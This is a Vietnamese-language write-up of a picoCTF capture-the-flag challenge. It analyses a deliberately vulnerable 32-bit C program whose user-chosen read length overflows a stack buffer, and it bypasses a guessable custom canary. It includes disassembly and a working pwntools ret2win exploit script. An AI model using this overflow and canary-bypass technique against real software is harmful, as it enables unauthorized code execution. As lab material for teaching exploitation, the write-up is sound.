# PicoCTF 2026: Offset-CycleV2

**Category:** Binary Exploitation  |
**Point:** 400 |
Difficult: Hard

> It's a race against time. Solve the binary exploit ASAP.
```bash
ssh -p <PORT> ctf-player@green-hill.picoctf.net
# Password: password
```
Bạn cần truy cập thử thách trên pico để mở instance

## 1. Tóm tắt
Bài này được tạo ra với một file thực thi khi chạy tạo ra một file thực thi lấy flag và một file source code của nó. Lỗ hổng Buffer Overflow cho phép nhập input1 là kích thước buffer để input2 nhập dữ liệu rác gây tràn bộ nhớ. Sử dụng kĩ thuật ret2win + đoán canary để tính toán offset để thay return address thành win address và lấy flag trong thời gian có hạn là 80s trước khi hai file bị xóa

Write-up được viết bởi chillfish
## 2. Static Analysing
### Chạy thử
Bài cho một file start thực thi sẽ tạo ra hai files tên là số ngẫu nhiên:
```bash
ctf-player@pico-chall$ ./start
[+] Selected file: filename.c
[+] Copied filename.c to current directory.
[+] Compilation successful: filename
[+] Binary filename has access to flag.txt
[*] Deletion scheduled: files will be removed in 80 seconds (even if this script exits).
```
Thực thi file binary được tạo, nó yêu cầu nhập hai lần:
```bash
ctf-player@pico-chall$ ./36
How many bytes?
> 100
Input> aaaaaaaaaaaaaaaaaaaaaaaaaa
Ok... Now Where's the flag?
```
### Phân tích code
<details>
<summary>Đọc source code</summary>
  
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BUFSIZE 334
#define CANARY_SIZE 4
#define FLAGSIZE 64

char global_canary[CANARY_SIZE];

void win() {
    char flag[FLAGSIZE];
    FILE *f = fopen("CodeBank/flag.txt", "r");

    if (!f) {
        puts("Missing flag.txt.");
        exit(0);
    }

    fgets(flag, FLAGSIZE, f);
    puts(flag);
}

void load_canary() {
    FILE *f = fopen("CodeBank/flag.txt", "r");

    if (!f) {
        puts("Missing flag.txt.");
        exit(0);
    }

    fread(global_canary, 1, CANARY_SIZE, f);
    fclose(f);
}

void vuln() {
    char local_canary[CANARY_SIZE];
    char buf[BUFSIZE];
    char input[BUFSIZE];
    int count, i = 0;

    memcpy(local_canary, global_canary, CANARY_SIZE);

    printf("How many bytes?\n> ");
    while (i < BUFSIZE && read(0, &input[i], 1) == 1 && input[i] != '\n')
        i++;

    sscanf(input, "%d", &count);

    printf("Input> ");
    read(0, buf, count);

    if (memcmp(local_canary, global_canary, CANARY_SIZE) != 0) {
        puts("***** Stack Smashing Detected *****");
        exit(0);
    }

    puts("Ok... Now Where's the flag?");
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setresgid(getegid(), getegid(), getegid());

    load_canary();
    vuln();
    return 0;
} 
```
</details>
Giá trị BUFSIZE sẽ thay đổi ngẫu nhiên sau mỗi phiên start mới

Bỏ qua lệnh gọi thư viện, ta xem xét qua những dòng set kích thước cho Buffer (random) , Canary (không thay đổi) và Flagsize (không thay đổi)
```C
#define BUFSIZE 334
#define CANARY_SIZE 4
#define FLAGSIZE 64
```
Tiếp theo là tạo biến cục bộ global_canary. Sau đó tạo hàm win với việc mở và báo lỗi nếu không có flag, rồi đặt 64bytes kích thước trong file flag.txt vào biến flag và in ra
```C
char global_canary[CANARY_SIZE];

void win() {
    char flag[FLAGSIZE];
    FILE *f = fopen("CodeBank/flag.txt", "r");

    if (!f) {
        puts("Missing flag.txt.");
        exit(0);
    }

    fgets(flag, FLAGSIZE, f);
    puts(flag);
}
```
Đến với một hàm quan trọng là load_canary, bỏ qua đoạn check flag, đến với lệnh ``` fread(global_canary, 1, CANARY_SIZE, f);```, fread sẽ đọc dữ liệu từ nơi chỉ định đến nơi đích theo một kích thước chỉ định [Hiểu thêm về fread](https://www.geeksforgeeks.org/c/fread-function-in-c/). 

Như vậy, hàm này sẽ đọc từ biến f(flag) lấy tối đa CANARY_SIZE bytes (4 bytes) vào global_canary, mà flag có 4 bytes đầu là **pico** nên ta có thể dễ dàng đoán được custom canary của bài này là 4 bytes cho chuỗi pico
```C
void load_canary() {
    FILE *f = fopen("CodeBank/flag.txt", "r");

    if (!f) {
        puts("Missing flag.txt.");
        exit(0);
    }

    fread(global_canary, 1, CANARY_SIZE, f);
    fclose(f);
}
```
Tiếp tục đến với hàm vuln, đây là phần tôi tốn nhiều thời gian để đọc hiểu code nhất, hàm này là nơi lỗi sẽ xảy ra, đầu tiên gọi local_canary, buf, input, count và i. Tiếp theo so sánh local_canary và global_canary theo CANARY_SIZE (4) [Hiểu về memcpy](https://www.geeksforgeeks.org/cpp/memcpy-in-cc/) để check canary trước. 

Vòng lặp while ở đây nhìn hơi rối nên tôi sẽ tách từng phần ra để phân tích ```while (i < BUFSIZE && read(0, &input[i], 1) == 1 && input[i] != '\n')```

Đầu tiên là điều kiện: i < BUFSIZE để tránh overflow. tiếp theo lệnh ```read(0, &input[i], 1) == 1``` sử dụng read với tham số đầu là 0 (tức là nhập từ bàn phím) nhập vào mảng tên input ở vị trí i (i ban đầu được cho là 0 và có i++ ở dưới) còn read() == 1 tức là khi hàm này chạy thành công(user nhập input, khi -1 hoặc 0 tức lỗi không nhập hoặc nhập lỗi) [Hiểu thêm về read](https://www.man7.org/linux/man-pages/man2/read.2.html). Điều kiện vòng lặp tiếp tục là ```input[i] != '\n')``` tức khi mảng input[i] gặp enter (hoặc \n từ script) sẽ dừng lại

Sau khi vòng lặp nhập lần một xong, nó sẽ chuyển giá trị trong mảng input qua count bằng lệnh ```sscanf(input, "%d", &count);``` [Hiểu thêm về sscanf](https://www.geeksforgeeks.org/c/how-to-read-data-using-sscanf-in-c/). Sau đó dùng lệnh read để đọc giá trị từ bàn phím (mode 0) vào buf với giới hạn kích thước là count. Lỗi Buffer Overflow xảy ra ở đoạn này, khi mà input thứ nhất được đặt làm giới hạn cho input thứ hai, vậy nếu input thứ nhất đặt một giá trị lớn hơn BUFSIZE được khai báo chẳng phải có thể gây lỗi ghi đè bộ nhớ rồi đúng không, các giá trị lớn ghi đè lên các phân vùng bộ nhớ khác và làm thay đổi giá trị của chúng, đè lên return address để chương trình không thoát ngay mà nhảy đến địa chỉ đó thực thi tiếp đến khi gặp lệnh thoát.

Cuối cùng nó sẽ dùng lệnh memcmp để so sánh canary và thoát chương trình
```C
void vuln() {
    char local_canary[CANARY_SIZE];
    char buf[BUFSIZE];
    char input[BUFSIZE];
    int count, i = 0;

    memcpy(local_canary, global_canary, CANARY_SIZE);

    printf("How many bytes?\n> ");
    while (i < BUFSIZE && read(0, &input[i], 1) == 1 && input[i] != '\n')
        i++;

    sscanf(input, "%d", &count);

    printf("Input> ");
    read(0, buf, count);

    if (memcmp(local_canary, global_canary, CANARY_SIZE) != 0) {
        puts("***** Stack Smashing Detected *****");
        exit(0);
    }

    puts("Ok... Now Where's the flag?");
}
```
Và cuối cùng là hàm main làm một số thao tác set quyền rồi gọi load_canary, vuln rồi exit
```C
int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setresgid(getegid(), getegid(), getegid());

    load_canary();
    vuln();
    return 0;
```
### Check bảo mật
Sử dụng lệnh checksec với file thực thi được tạo để xem mitigation của file
```bash
ctf-player@pico-chall$ checksec 36
[*] '/home/ctf-player/36'
    Arch:       i386-32-little       -> saved rbp và return address chỉ có 4 bytes
    RELRO:      Partial RELRO
    Stack:      No canary found      -> Custom canary
    NX:         NX enabled
    PIE:        No PIE (0x8048000)   -> Không random địa chỉ mỗi phiên chạy -> dễ tính offset
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
Tạm thời ta có thể chắc chắn rằng bài này có canary là 'pico' và sử dụng kiến trúc 32-bit, điều cần thiết nhất bây giờ là địa chỉ của win, offset và vị trí canary trong hệ thống (canary thường đứng trước saved rbp nhưng cũng có thể đặt ở chỗ khác)

## 3. Debugging
Bài này phân tích động là không thể vì việc set quyền của folder CodeBank cho sẵn bị hạn chế, tôi chỉ có thể thực thi file ở ngoài (Dùng ./) nhưng khi dùng gdb để run or start file thì quyền đối với folder đó không được tự do nữa, gặp lỗi Missing flag.txt dù đã set flag giả hay thử mọi cách để chỉnh sửa folder CodeBank
nên những thứ tôi có thể dùng tiếp theo trong gdb chỉ là đọc code assembly và lấy địa chỉ hàm win được thôi

### p win
Sau khi mở gdb với file, tôi nhanh chóng dùng ```p win``` để xem địa chỉ của hàm và nhận được địa chỉ chính xác là **0x8049316**
```bash
(gdb) p win
$1 = {<text variable, no debug info>} 0x8049316 <win>
```

### load_canary
Tiếp tục đọc code asm của hàm load_canary bằng lệnh ```disas load_canary``` tôi nhận được code:
```asm
Dump of assembler code for function load_canary:
   0x08049393 <+0>:     endbr32
   0x08049397 <+4>:     push   ebp
   0x08049398 <+5>:     mov    ebp,esp
   0x0804939a <+7>:     push   ebx
   0x0804939b <+8>:     sub    esp,0x14
   0x0804939e <+11>:    call   0x8049250 <__x86.get_pc_thunk.bx>
   0x080493a3 <+16>:    add    ebx,0x2c5d
   0x080493a9 <+22>:    sub    esp,0x8
   0x080493ac <+25>:    lea    eax,[ebx-0x1ff8]
   0x080493b2 <+31>:    push   eax
   0x080493b3 <+32>:    lea    eax,[ebx-0x1ff6]
   0x080493b9 <+38>:    push   eax
   0x080493ba <+39>:    call   0x80491e0 <fopen@plt>
   0x080493bf <+44>:    add    esp,0x10
   0x080493c2 <+47>:    mov    DWORD PTR [ebp-0xc],eax
   0x080493c5 <+50>:    cmp    DWORD PTR [ebp-0xc],0x0
   0x080493c9 <+54>:    jne    0x80493e7 <load_canary+84>
   0x080493cb <+56>:    sub    esp,0xc
   0x080493ce <+59>:    lea    eax,[ebx-0x1fe4]
   0x080493d4 <+65>:    push   eax
   0x080493d5 <+66>:    call   0x8049190 <puts@plt>
   0x080493da <+71>:    add    esp,0x10
   0x080493dd <+74>:    sub    esp,0xc
   0x080493e0 <+77>:    push   0x0
   0x080493e2 <+79>:    call   0x80491a0 <exit@plt>
   0x080493e7 <+84>:    push   DWORD PTR [ebp-0xc]
   0x080493ea <+87>:    push   0x4
   0x080493ec <+89>:    push   0x1
   0x080493ee <+91>:    mov    eax,0x804c050
   0x080493f4 <+97>:    push   eax
   0x080493f5 <+98>:    call   0x8049180 <fread@plt>
   0x080493fa <+103>:   add    esp,0x10
   0x080493fd <+106>:   sub    esp,0xc
   0x08049400 <+109>:   push   DWORD PTR [ebp-0xc]
   0x08049403 <+112>:   call   0x8049150 <fclose@plt>
   0x08049408 <+117>:   add    esp,0x10
   0x0804940b <+120>:   nop
   0x0804940c <+121>:   mov    ebx,DWORD PTR [ebp-0x4]
   0x0804940f <+124>:   leave
   0x08049410 <+125>:   ret
```
vì phần quan trọng của hàm này nằm ở hàm fread nên tôi sẽ chỉ tìm lệnh call hàm đó thôi. Bạn có thấy lệnh ```mov    eax,0x804c050``` chứ, đó là lệnh đặt địa chỉ của global_canary vào eax đó, sau đó khi call fread nó sẽ xử lí các số liệu theo những cái được set up trước đó
```asm
   0x080493ea <+87>:    push   0x4
   0x080493ec <+89>:    push   0x1
   0x080493ee <+91>:    mov    eax,0x804c050
   0x080493f4 <+97>:    push   eax
   0x080493f5 <+98>:    call   0x8049180 <fread@plt>
```
### vuln
Giờ khám vuln nhé, phần này chứa offset và vị trí của canary trong bài
```asm
Dump of assembler code for function vuln:
   0x08049411 <+0>:     endbr32
   0x08049415 <+4>:     push   ebp
   0x08049416 <+5>:     mov    ebp,esp
   0x08049418 <+7>:     push   ebx
   0x08049419 <+8>:     sub    esp,0x2b4
   0x0804941f <+14>:    call   0x8049250 <__x86.get_pc_thunk.bx>
   0x08049424 <+19>:    add    ebx,0x2bdc
   0x0804942a <+25>:    mov    DWORD PTR [ebp-0xc],0x0
   0x08049431 <+32>:    mov    eax,0x804c050
   0x08049437 <+38>:    mov    eax,DWORD PTR [eax]
   0x08049439 <+40>:    mov    DWORD PTR [ebp-0x10],eax
   0x0804943c <+43>:    sub    esp,0xc
   0x0804943f <+46>:    lea    eax,[ebx-0x1fd2]
   0x08049445 <+52>:    push   eax
   0x08049446 <+53>:    call   0x8049130 <printf@plt>
   0x0804944b <+58>:    add    esp,0x10
   0x0804944e <+61>:    jmp    0x8049454 <vuln+67>
   0x08049450 <+63>:    add    DWORD PTR [ebp-0xc],0x1
   0x08049454 <+67>:    cmp    DWORD PTR [ebp-0xc],0x14d
   0x0804945b <+74>:    jg     0x804948f <vuln+126>
   0x0804945d <+76>:    lea    edx,[ebp-0x2ac]
   0x08049463 <+82>:    mov    eax,DWORD PTR [ebp-0xc]
   0x08049466 <+85>:    add    eax,edx
   0x08049468 <+87>:    sub    esp,0x4
   0x0804946b <+90>:    push   0x1
   0x0804946d <+92>:    push   eax
   0x0804946e <+93>:    push   0x0
   0x08049470 <+95>:    call   0x8049120 <read@plt>
   0x08049475 <+100>:   add    esp,0x10
   0x08049478 <+103>:   cmp    eax,0x1
   0x0804947b <+106>:   jne    0x804948f <vuln+126>
   0x0804947d <+108>:   lea    edx,[ebp-0x2ac]
   0x08049483 <+114>:   mov    eax,DWORD PTR [ebp-0xc]
   0x08049486 <+117>:   add    eax,edx
   0x08049488 <+119>:   movzx  eax,BYTE PTR [eax]
   0x0804948b <+122>:   cmp    al,0xa
   0x0804948d <+124>:   jne    0x8049450 <vuln+63>
   0x0804948f <+126>:   sub    esp,0x4
   0x08049492 <+129>:   lea    eax,[ebp-0x2b0]
   0x08049498 <+135>:   push   eax
   0x08049499 <+136>:   lea    eax,[ebx-0x1fbf]
   0x0804949f <+142>:   push   eax
   0x080494a0 <+143>:   lea    eax,[ebp-0x2ac]
   0x080494a6 <+149>:   push   eax
   0x080494a7 <+150>:   call   0x80491c0 <__isoc99_sscanf@plt>
   0x080494ac <+155>:   add    esp,0x10
   0x080494af <+158>:   sub    esp,0xc
   0x080494b2 <+161>:   lea    eax,[ebx-0x1fbc]
   0x080494b8 <+167>:   push   eax
   0x080494b9 <+168>:   call   0x8049130 <printf@plt>
   0x080494be <+173>:   add    esp,0x10
   0x080494c1 <+176>:   mov    eax,DWORD PTR [ebp-0x2b0]
   0x080494c7 <+182>:   sub    esp,0x4
   0x080494ca <+185>:   push   eax
   0x080494cb <+186>:   lea    eax,[ebp-0x15e]
   0x080494d1 <+192>:   push   eax
   0x080494d2 <+193>:   push   0x0
   0x080494d4 <+195>:   call   0x8049120 <read@plt>
   0x080494d9 <+200>:   add    esp,0x10
   0x080494dc <+203>:   sub    esp,0x4
   0x080494df <+206>:   push   0x4
   0x080494e1 <+208>:   mov    eax,0x804c050
   0x080494e7 <+214>:   push   eax
   0x080494e8 <+215>:   lea    eax,[ebp-0x10]
   0x080494eb <+218>:   push   eax
   0x080494ec <+219>:   call   0x8049160 <memcmp@plt>
   0x080494f1 <+224>:   add    esp,0x10
   0x080494f4 <+227>:   test   eax,eax
   0x080494f6 <+229>:   je     0x8049514 <vuln+259>
   0x080494f8 <+231>:   sub    esp,0xc
   0x080494fb <+234>:   lea    eax,[ebx-0x1fb4]
   0x08049501 <+240>:   push   eax
   0x08049502 <+241>:   call   0x8049190 <puts@plt>
   0x08049507 <+246>:   add    esp,0x10
   0x0804950a <+249>:   sub    esp,0xc
   0x0804950d <+252>:   push   0x0
   0x0804950f <+254>:   call   0x80491a0 <exit@plt>
   0x08049514 <+259>:   sub    esp,0xc
   0x08049517 <+262>:   lea    eax,[ebx-0x1f90]
   0x0804951d <+268>:   push   eax
   0x0804951e <+269>:   call   0x8049190 <puts@plt>
   0x08049523 <+274>:   add    esp,0x10
   0x08049526 <+277>:   nop
   0x08049527 <+278>:   mov    ebx,DWORD PTR [ebp-0x4]
   0x0804952a <+281>:   leave
   0x0804952b <+282>:   ret
```
Phần mà tôi quan tâm sẽ là phần chứa lệnh ``` memcmp``` và ```read(0, buf, count);``` vì chúng chứa các giá trị cần thiết như buf và canary

Bạn có thấy rằng lệnh lea(lấy địa chỉ từ nơi này đưa cho thằng khác cầm) lấy địa chỉ của **ebp-0x15e** để đặt vào eax không, đây chính là đặt địa chỉ cách đỉnh buffer 0x15e bytes (350 bytes) cách 16bytes đơn vị so với buffer được cấp trong source code (Do cơ chế căn lề của stack để tối ưu hiệu năng và khớp với hệ thống nên nó sẽ add thêm padding 16bytes vào là như vậy)  
```asm
   0x080494c7 <+182>:   sub    esp,0x4
   0x080494ca <+185>:   push   eax
   0x080494cb <+186>:   lea    eax,[ebp-0x15e]
   0x080494d1 <+192>:   push   eax
   0x080494d2 <+193>:   push   0x0
   0x080494d4 <+195>:   call   0x8049120 <read@plt>
```
Tiếp theo ngay bên dưới lệnh call read, có lệnh call memcmp, một điều tôi thấy rõ rằng là cía địa chỉ của global canary lại xuất hiện và được set vào eax, như vậy rõ ràng rằng cách hoạt động của memcmp đặt thứ để so sánh là global canary sẽ đặt vào eax, còn thử được so sánh sẽ được giao địa chỉ cho eax sau lệnh push để bảo toàn dữ liệu cũ (push đẩy eax vào stack xếp chồng các giá trị).

```lea    eax,[ebp-0x10]``` nơi sẽ được global canary so sánh, không gì khác là local canary - cái custom canary trong file. Nó được đặt tại **ebp-0x10** (16 bytes)
```asm
   0x080494d9 <+200>:   add    esp,0x10
   0x080494dc <+203>:   sub    esp,0x4
   0x080494df <+206>:   push   0x4
   0x080494e1 <+208>:   mov    eax,0x804c050
   0x080494e7 <+214>:   push   eax
   0x080494e8 <+215>:   lea    eax,[ebp-0x10]
   0x080494eb <+218>:   push   eax
   0x080494ec <+219>:   call   0x8049160 <memcmp@plt>
```
### Tính toán 
Khi đã có offset (tới saved ebp) được xác định tại lệnh call read, mà canary (4 bytes) lại từ saved ebp - 12 bytes (vì 4 bytes của canary nên 16-4=12)

[**return address (4 bytes)**] -> [**saved ebp (4 bytes)**]  -> (**12 bytes**) -> [**canary (4 bytes)**] -> **offset(x - 16 bytes )**

## 4. Chiến thuật khai thác
Vì bài này thời gian rất có hạn (80s) nên tôi sẽ cần một thao tác nhanh chính xác kết hợp một payload script để có được flag

* Bước 1: Viết sẵn script, tôi sử dụng python cho tính tiện dụng và hàm pwntools hiệu quả của nó. Script này cho phép tôi chỉ cần sửa filename và offset dạng hex tìm được từ lệnh lea, nó sẽ tự chuyển thành decimal và tự trừ ra offset chuẩn để gửi payload. Tôi cũng kết hợp 12 bytes đến saved ebp và 4 bytes rác của saved ebp lại thành 16 bytes để nhìn gọn nhất. Sau đó dùng các lệnh sendafter để gửi payload
```python
from pwn import *

p = process('./filename')

offset = int('realhexoffset', 16) - int('0x10', 16)
win = p32(0x8049316)
canary = b'pico'
payload = b'a'*offset + canary + b'b'*16 + win

p.sendafter(b'> ', b'1000\n')
p.sendafter(b'Input> ', payload)

p.interactive()
```
* Bước 2: Ngay khi ./start chương trình, tôi sẽ mở gdb -> disas vuln -> tìm lệnh call read và đọc offset -> đọc call memcmp nếu thấy vị trí canary thay đổi thì tính toán nhanh và sửa vào script(đoạn biến offset và sửa lại b'b'*16 - nhưng bài này không random vị trí)
* Bước 3: Chạy script và nhận flag

Kết quả:
```bash
[+] Starting local process './26': pid 52
[*] Switching to interactive mode
Ok... Now Where's the flag?
picoCTF{}
[*] Got EOF while reading in interactive
```
Tự làm đi nhé baby
